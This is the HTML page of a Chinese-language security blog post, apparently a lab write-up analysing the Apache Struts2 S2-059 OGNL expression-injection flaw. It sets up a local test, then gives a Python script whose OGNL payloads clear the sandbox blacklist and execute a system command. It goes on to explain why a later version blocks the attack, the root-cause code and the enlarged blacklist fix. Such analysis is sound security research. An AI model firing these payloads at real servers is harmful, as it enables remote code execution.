@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>struts2系列漏洞 S2-059 - Twings</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期六, 四月 16日 2022, 1:29 凌晨
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    1k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      5 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 经典 Java 软件漏洞 struts 系列，准备一个个看过去。</p>
+<span id="more"></span>
+
+<hr>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>影响版本Struts 2.0.0 - Struts 2.5.20，这里使用struts 2.5.20。</p>
+<p>根据<a href="https://cwiki.apache.org/confluence/display/WW/S2-059">官方描述</a>，问题出在struts2会对标签中的某些属性（如id）的值进行双重评估，修改模板文件：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="attr">s</span>:a id=<span class="string">&quot;%&#123;username&#125;&quot;</span> href=<span class="string">&quot;%&#123;url&#125;&quot;</span>&gt;<span class="title class_">List</span> available <span class="title class_">Employees</span>&lt;/<span class="attr">s</span>:a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>结果部署时出问题了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[2022-04-15 10:44:26,465] Artifact struts2:war exploded: Error during artifact deployment. See server log for details.</span><br></pre></td></tr></table></figure>
+
+<p>Log：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.NoClassDefFoundError: javax/servlet/Filter</span><br></pre></td></tr></table></figure>
+
+<p>根据<a href="https://blog.csdn.net/COFACTOR/article/details/121257359">参考文章</a>，应该是Tomcat版本问题，引用的包发生了变化，换成Tomcat9，成功部署，其他代码不没有改动。</p>
+<p>此时访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/login.action?username=%25%7B8*8%7D</span><br></pre></td></tr></table></figure>
+
+<p>可以看到：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=<span class="string">&quot;64&quot;</span> href=<span class="string">&quot;&quot;</span>&gt;<span class="title class_">List</span> available <span class="title class_">Employees</span>&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>模板文件中的id值%{url}进行了双重评估，发生了表达式注入。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>同S2-057的payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:8080/login.action&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#x27;&#x27;)).(#ognlUtil.setExcludedPackageNames(&#x27;&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#x27;calc&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res1 = requests.post(url, data=data1)</span><br><span class="line"><span class="built_in">print</span>(res1.text)</span><br><span class="line">res2 = requests.post(url, data=data2)</span><br><span class="line"><span class="built_in">print</span>(res2.text)</span><br></pre></td></tr></table></figure>
+
+<p>但是打不通，换成参考文章中使用的2.5.16版本的struts2就打通了，Struts 2.5.17也打不通，问题应该就出在Struts 2.5.17上面了。</p>
+<p>在Struts 2.5.17中，此时通过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#attr[&#x27;struts.valueStack&#x27;].context</span><br></pre></td></tr></table></figure>
+
+<p>无法获取到OgnlValueStack中的context，调试找到OgnlRuntime类的getFieldValue函数中：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (checkAccessAndExistence) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((f == <span class="literal">null</span>) || !context.getMemberAccess().isAccessible(context, target, f, propertyName)) &#123;</span><br><span class="line">        result = NotFound;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>到这里为止的代码Struts 2.5.16和Struts 2.5.17没有区别，区别在context.getMemberAccess()会获得一个版本不同的SecurityMemberAccess类进行黑名单验证：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">targetClass</span> <span class="operator">=</span> target.getClass();</span><br><span class="line"><span class="type">Class</span> <span class="variable">memberClass</span> <span class="operator">=</span> member.getDeclaringClass();</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (isPackageExcluded(targetClass.getPackage(), memberClass.getPackage())) &#123;</span><br><span class="line">    LOG.warn(<span class="string">&quot;Package of target [&#123;&#125;] or package of member [&#123;&#125;] are excluded!&quot;</span>, target, member);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>黑名单如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ognl., freemarker.core., javax., freemarker.ext.rhino., javassist., com.opensymphony.xwork2.security., sun.reflect., com.opensymphony.xwork2.ognl., freemarker.template., com.opensymphony.xwork2.util.]</span><br></pre></td></tr></table></figure>
+
+<p>因为OgnlValueStack的package为com.opensymphony.xwork2.ognl，所以就触发了黑名单，无法获取其中的成员字段。</p>
+<p>黑名单存放在struts-default.xml中：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;struts.excludedClasses&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">value</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">            java.lang.Object,</span></span></span><br><span class="line"><span class="string"><span class="tag">            java.lang.Runtime,</span></span></span><br><span class="line"><span class="string"><span class="tag">            java.lang.System,</span></span></span><br><span class="line"><span class="string"><span class="tag">            java.lang.Class,</span></span></span><br><span class="line"><span class="string"><span class="tag">            java.lang.ClassLoader,</span></span></span><br><span class="line"><span class="string"><span class="tag">            java.lang.Shutdown,</span></span></span><br><span class="line"><span class="string"><span class="tag">            java.lang.ProcessBuilder,</span></span></span><br><span class="line"><span class="string"><span class="tag">            com.opensymphony.xwork2.ActionContext&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- this must be valid regex, each &#x27;.&#x27; in package name must be escaped! --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- it&#x27;s more flexible but slower than simple string comparison --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- constant name=&quot;struts.excludedPackageNamePatterns&quot; value=&quot;^java\.lang\..*,^ognl.*,^(?!javax\.servlet\..+)(javax\..+)&quot; / --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- this is simpler version of the above used with string comparison --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;struts.excludedPackageNames&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">value</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">            ognl.,</span></span></span><br><span class="line"><span class="string"><span class="tag">            javax.,</span></span></span><br><span class="line"><span class="string"><span class="tag">            freemarker.core.,</span></span></span><br><span class="line"><span class="string"><span class="tag">            freemarker.template.,</span></span></span><br><span class="line"><span class="string"><span class="tag">            freemarker.ext.rhino.,</span></span></span><br><span class="line"><span class="string"><span class="tag">            sun.reflect.,</span></span></span><br><span class="line"><span class="string"><span class="tag">            javassist.,</span></span></span><br><span class="line"><span class="string"><span class="tag">            com.opensymphony.xwork2.ognl.,</span></span></span><br><span class="line"><span class="string"><span class="tag">            com.opensymphony.xwork2.security.,</span></span></span><br><span class="line"><span class="string"><span class="tag">            com.opensymphony.xwork2.util.&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>给ASTProperty的getValueBody函数下个断点，往前找到UIBean类的populateComponentHtmlId函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">populateComponentHtmlId</span><span class="params">(Form form)</span> &#123;</span><br><span class="line">    String tryId;</span><br><span class="line">    String generatedId;</span><br><span class="line">    <span class="keyword">if</span> (id != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// this check is needed for backwards compatibility with 2.1.x</span></span><br><span class="line">        tryId = findStringIfAltSyntax(id);</span><br><span class="line">    &#125; </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>findStringIfAltSyntax：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> String <span class="title function_">findStringIfAltSyntax</span><span class="params">(String expr)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (altSyntax()) &#123;</span><br><span class="line">        <span class="keyword">return</span> findString(expr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> expr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用了findString解析表达式。</p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>在Struts 2.5.22中，struts-default.xml改了一下，黑名单变多了：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;struts.excludedClasses&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">value</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">            java.lang.Object,</span></span></span><br><span class="line"><span class="string"><span class="tag">            java.lang.Runtime,</span></span></span><br><span class="line"><span class="string"><span class="tag">            java.lang.System,</span></span></span><br><span class="line"><span class="string"><span class="tag">            java.lang.Class,</span></span></span><br><span class="line"><span class="string"><span class="tag">            java.lang.ClassLoader,</span></span></span><br><span class="line"><span class="string"><span class="tag">            java.lang.Shutdown,</span></span></span><br><span class="line"><span class="string"><span class="tag">            java.lang.ProcessBuilder,</span></span></span><br><span class="line"><span class="string"><span class="tag">            sun.misc.Unsafe,</span></span></span><br><span class="line"><span class="string"><span class="tag">            com.opensymphony.xwork2.ActionContext&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- this must be valid regex, each &#x27;.&#x27; in package name must be escaped! --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- it&#x27;s more flexible but slower than simple string comparison --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- constant name=&quot;struts.excludedPackageNamePatterns&quot; value=&quot;^java\.lang\..*,^ognl.*,^(?!javax\.servlet\..+)(javax\..+)&quot; / --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- this is simpler version of the above used with string comparison --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;struts.excludedPackageNames&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">value</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">            ognl.,</span></span></span><br><span class="line"><span class="string"><span class="tag">            java.io.,</span></span></span><br><span class="line"><span class="string"><span class="tag">            java.net.,</span></span></span><br><span class="line"><span class="string"><span class="tag">            java.nio.,</span></span></span><br><span class="line"><span class="string"><span class="tag">            javax.,</span></span></span><br><span class="line"><span class="string"><span class="tag">            freemarker.core.,</span></span></span><br><span class="line"><span class="string"><span class="tag">            freemarker.template.,</span></span></span><br><span class="line"><span class="string"><span class="tag">            freemarker.ext.jsp.,</span></span></span><br><span class="line"><span class="string"><span class="tag">            freemarker.ext.rhino.,</span></span></span><br><span class="line"><span class="string"><span class="tag">            sun.misc.,</span></span></span><br><span class="line"><span class="string"><span class="tag">            sun.reflect.,</span></span></span><br><span class="line"><span class="string"><span class="tag">            javassist.,</span></span></span><br><span class="line"><span class="string"><span class="tag">            org.apache.velocity.,</span></span></span><br><span class="line"><span class="string"><span class="tag">            org.objectweb.asm.,</span></span></span><br><span class="line"><span class="string"><span class="tag">            org.springframework.context.,</span></span></span><br><span class="line"><span class="string"><span class="tag">            com.opensymphony.xwork2.inject.,</span></span></span><br><span class="line"><span class="string"><span class="tag">            com.opensymphony.xwork2.ognl.,</span></span></span><br><span class="line"><span class="string"><span class="tag">            com.opensymphony.xwork2.security.,</span></span></span><br><span class="line"><span class="string"><span class="tag">            com.opensymphony.xwork2.util.&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>不知道修的是什么绕过方法，但是表达式执行点没修，也就是说绕过了沙盒这里还是能打。</p>
+<hr>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://xz.aliyun.com/t/8653">https://xz.aliyun.com/t/8653</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Java/">Java</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Struts2/">Struts2</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2022/04/17/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-061/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>struts2系列漏洞 S2-061</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2022/03/09/%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB-3/">
+                        <span>论文研读(3)</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "struts2系列漏洞 S2-059&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
